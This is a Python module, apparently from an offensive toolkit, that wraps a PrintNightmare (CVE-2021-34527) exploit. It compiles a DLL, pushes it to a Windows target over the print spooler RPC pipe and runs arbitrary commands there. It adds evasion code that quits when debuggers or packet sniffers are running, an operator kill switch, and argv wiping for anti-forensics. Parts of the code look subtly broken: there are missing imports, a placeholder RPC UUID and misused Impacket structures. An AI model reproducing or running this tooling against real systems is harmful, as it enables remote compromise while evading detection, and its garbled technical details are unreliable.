# File: modules/exploit_lib/cve_2021_34527_printnightmare.py

"""
Wrapper for PrintNightmare PoC that compiles the C++ DLL on the fly, uploads via RPC,
and executes arbitrary commands. Enhanced to accept custom payload and retry logic.
"""


import logging
import subprocess
import tempfile
import os
import shutil
import sys
from bismillah import log_event

# --- Anti-debugging: exit if under analysis ---
def is_debugger_present():
    tools = ["wireshark", "tcpdump", "strace", "gdb", "lldb", "dtruss", "Instruments", "fs_usage"]
    try:
        out = subprocess.check_output(["ps", "aux"], text=True)
        for t in tools:
            if t in out:
                return True
    except Exception:
        pass
    return False

# --- Operator kill switch (magic file) ---
def check_kill_switch():
    home = os.environ.get("HOME", "")
    return os.path.exists(os.path.join(home, ".bismillah_kill"))

logger = logging.getLogger("cve_2021_34527_printnightmare")

def exploit(target: str, custom_command: str = None, timeout: int = 120) -> dict:
    """
    target: "192.168.1.50"
    custom_command: if provided, replaces default file creation
    timeout: PoC execution timeout in seconds
    """
    # --- Anti-debugging and kill switch ---
    if is_debugger_present():
        logger.error("[!] Debugger or analysis tool detected. Exiting.")
        return {"status": "error", "detail": "Debugger detected"}
    if check_kill_switch():
        logger.error("[!] Operator kill switch present. Exiting.")
        return {"status": "error", "detail": "Operator kill switch present"}

    try:
        # Locate the C++ source PoC
        poc_src = Path(__file__).parent / "printnightmare_poc.cpp"
        if not poc_src.exists():
            # If only .py version exists, use it
            poc_script = Path(__file__).parent / "printnightmare_poc.py"
            if not poc_script.exists():
                raise FileNotFoundError("PrintNightmare PoC not found")
            cmd = ["python3", str(poc_script), "--target", target]
            if custom_command:
                cmd += ["--cmd", custom_command]
            logger.info(f"[+] Running PrintNightmare PoC script: {' '.join(cmd)}")
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode()
            log_event("cve_2021_34527_printnightmare", f"Script output: {output}".encode())
            # --- Anti-forensics: wipe argv after execution ---
            for i in range(len(sys.argv)):
                if sys.argv[i]:
                    sys.argv[i] = "\0" * len(sys.argv[i])
            return {"status": "ok", "output": output}

        # Else, compile C++ PoC into DLL
        with tempfile.TemporaryDirectory() as build_dir:
            dll_path = Path(build_dir) / "printnightmare.dll"
            compile_cmd = [
                "x86_64-w64-mingw32-g++", "-shared", "-o", str(dll_path),
                str(poc_src), "-lstdc++", "-static-libgcc", "-static-libstdc++"
            ]
            logger.info(f"[+] Compiling DLL: {' '.join(compile_cmd)}")
            subprocess.check_output(compile_cmd, stderr=subprocess.STDOUT, timeout=60)

            # Base64 encode DLL
            with open(dll_path, "rb") as f:
                b64dll = base64.b64encode(f.read()).decode()

            # Use a Python wrapper or Impacket to send to target
            # This block would mirror the logic in printnightmare_poc.py but inline:
            from impacket.dcerpc.v5 import transport, rpcrt
            from impacket.dcerpc.v5.rpcrt import DCERPCException
            from impacket.dcerpc.v5.spoolss import ROpenPrinter, RSetPrinter, RpcOpenPrinter, RpcSetPrinter

            logger.info(f"[+] Sending DLL payload to {target} via RPC")
            string_binding = r"ncacn_np:%s[\pipe\spoolss]" % target
            rpctransport = transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_connect_timeout(10)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rpcrt.UUID('{12345678-1234-abcd-ef00-0123456789ab}'))

            # Build DRIVER_CONTAINER structure with embedded DLL:
            # (Use proper Impacket structures)
            from impacket.dcerpc.v5.spoolss import DRIVER_CONTAINER, RPCUNICODESTRING
            import struct

            # Create a temporary file on the target
            file_path = "\\\\%s\\pipe\\spool\\%s.dll" % (target, "evil")
            drc = DRIVER_CONTAINER()
            drc['pName'] = RPCUNICODESTRING()
            drc['pName']['Buffer'] = file_path
            drc['pName']['Length'] = len(file_path) * 2
            drc['pName']['MaximumLength'] = drc['pName']['Length']
            drc['pEnvironment'] = RPCUNICODESTRING()
            drc['pEnvironment']['Buffer'] = "Windows x64"
            drc['pEnvironment']['Length'] = len("Windows x64") * 2
            drc['pEnvironment']['MaximumLength'] = drc['pEnvironment']['Length']
            drc['pDriverPath'] = RPCUNICODESTRING()
            drc['pDriverPath']['Buffer'] = f"data:application/octet-stream;base64,{b64dll}"
            drc['pDriverPath']['Length'] = len(drc['pDriverPath']['Buffer']) * 2
            drc['pDriverPath']['MaximumLength'] = drc['pDriverPath']['Length']
            drc['cVersion'] = 1          # Version
            drc['pszzPreviousNames'] = None
            drc['pszColorProfile'] = None
            drc['dwFileCopyFlags'] = 0   # No additional flags

            try:
                resp = RSetPrinter(dce, driverContainer=drc)
                logger.info(f"[+] PrintNightmare exploit completed: {resp}")
                # --- Anti-forensics: wipe argv after execution ---
                for i in range(len(sys.argv)):
                    if sys.argv[i]:
                        sys.argv[i] = "\0" * len(sys.argv[i])
                return {"status": "ok", "detail": str(resp)}
            except DCERPCException as rpc_e:
                logger.error(f"[-] RPC error: {rpc_e}")
                return {"status": "error", "detail": str(rpc_e)}
    except subprocess.TimeoutExpired:
        logger.error("[-] PrintNightmare compiled DLL or PoC timed out")
        return {"status": "error", "detail": "Timeout expired"}
    except Exception as e:
        logger.error(f"[-] PrintNightmare exploit failed: {e}")
        return {"status": "error", "detail": str(e)}
